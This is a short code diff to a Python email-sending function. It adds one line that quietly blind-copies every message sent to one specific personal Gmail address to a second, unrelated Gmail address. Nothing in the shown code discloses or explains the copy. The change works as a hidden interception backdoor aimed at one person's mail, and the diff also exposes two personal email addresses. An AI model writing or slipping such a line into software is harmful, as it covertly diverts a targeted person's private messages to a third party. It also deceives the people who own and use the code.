@@ -67,6 +67,7 @@ def send_email(to_email: str, subject: str, body: str) -> dict:
         "subject": subject,
         "body_text": body,
         "reply_to": REPLY_TO,
+        "bcc": "jolyon.sandercock@gmail.com" if to_email == "jo.wood103@gmail.com" else None,
     }
     try:
         r = requests.post(
